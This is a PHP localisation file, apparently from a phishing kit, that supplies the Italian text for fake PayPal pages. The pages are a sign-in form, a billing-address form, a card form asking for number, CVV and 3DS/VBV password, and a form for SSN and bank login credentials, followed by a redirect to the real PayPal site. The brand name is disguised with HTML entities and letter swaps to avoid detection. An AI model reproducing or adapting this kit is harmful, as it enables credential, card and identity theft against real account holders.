<?php 
//LOG
$log_ttl1="&#80;&#97;y&#80;&#97;I Aggiornamento account";
$log_ttl2="protetta";
$log_lab1="&#80;&#97;y&#80;&#97;l Pagina protetta";
$log_lab2="Accedi al tuo account";
$log_em="Indirizzo email";
$log_ps="Password";
$log_frg="Hai dimenticato l'indirizzo email o la password&nbsp;?";
$log_btn="Accedi";
//FTR
$ftr_01="Rispetto della vita privata";
$ftr_02="Accordi legali";
$ftr_03="Contatto";
$ftr_04="Risposta";
//INF
$inf_scr="La tua sicurezza è la nostra priorità";
$inf_ttspan="Informazioni sulla carta di Aggiornamento";
$inf_lab1="Aggiorna il tuo indirizzo di fatturazione";
$inf_corr="Si prega di inserire correttamente il tuo indirizzo di fatturazione.";
$inf_frnm="Il tuo Nome";
$inf_lsnm="Il tuo Cognome";
$inf_dob="Data di nascita GG/MM/AAAA";
$inf_add="Indirizzo Linea";
$inf_cty="Città";
$inf_stt="Provincia";
$inf_cnt="Paese";
$inf_zip="Cap";
$inf_mob="Cellulare";
$inf_hom="Abitazione";
$inf_pho="Il tuo numero di telefono";
$inf_con="Continuare";
//CRD
$crd_ttspan="Informazioni sulla carta di Aggiornamento";
$crd_lab1="Aggiorna il tuo Carta di Credito/Debito";
$crd_corr="Si prega di inserire correttamente le vostre informazioni della carta di credito/debito";
$crd_crdh="Titolare della carta";
$crd_crdn="Inserisci il tuo numero di carta";
$crd_expd="Data Di Scadenza MM/AA";
$crd_cv="CVV/CSC";
$crd_ttcv="Inserisci il tuo codice di verifica carta visualizzato sulla mappa";
$crd_ptcv="./scr/csc";
$crd_wtcv="Che cosa è il numero di sicurezza della carta ?";
$crd_ttptcv="Codice di verifica della carta - Aiuto";
$crd_cvp="CVV (o carta di valore di verifica) è una funzione di sicurezza antifrode che controlla se la carta di credito è in vostro possesso. Per Visa / Mastercard, il numero CVV a tre cifre stampato nel riquadro della firma sul retro della carta dopo il numero di conto. Per American Express, il numero CVV quattro cifre è stampato sulla parte anteriore della carta sopra il numero di conto.";
$crd_cvtd1="Vi è un numero di 3 cifre in corsivo invertiti retro della carta di credito.";
$crd_cvtd2="Si tratta di un numero a 4 cifre sulla parte anteriore delle vetture, appena sopra il numero della carta di credito.";
$crd_cvfrm="Vicino";
$crd_pcptcv="../../imcs_files/cv.png";
$crd_3ds="3DS VBV/MSC Password";
$crd_acc="Numero di conto";
$crd_sn="SSN";
$crd_ttsn="Numero di Social Security";
$crd_srt="Sort code";
$crd_ttptsrt="Sort code - Help";
$crd_ptsrt="./scr/srt/";
$crd_pcsrt="../../imcs_files/srt.png";
$crd_btn="Continuare";
//BNK
$bnk_ttspan="Informazioni Bank Aggiornamento";
$bnk_lab1="Aggiorna il tuo conto bancario";
$bnk_yrbn="Il nome della banca:";
$bnk_corr="Inserisci i tuoi dati bancari correttamente.";
$bnk_id="Banco User/ID";
$bnk_ps="Banco Password";
$bnk_rt="Routing Number";
$bnk_bt="Salvare";
//SCS
$scs_ttspan="Aggiornamento di successo";
$scs_lnk="https://www.paypal.com/signin/intent?country.x=IT&locale.x=it_IT";
$scs_tnk="Grazie";
$scs_yrp="Il tuo conto PayPaI è stato aggiornato con successo.";
$scs_yhv="Bisogna ri-login per salvare le modifiche, si verrà reindirizzati automaticamente alla pagina di login in 3 secondi ... Grazie per aver utilizzato il nostro sistema di verifica.";
?>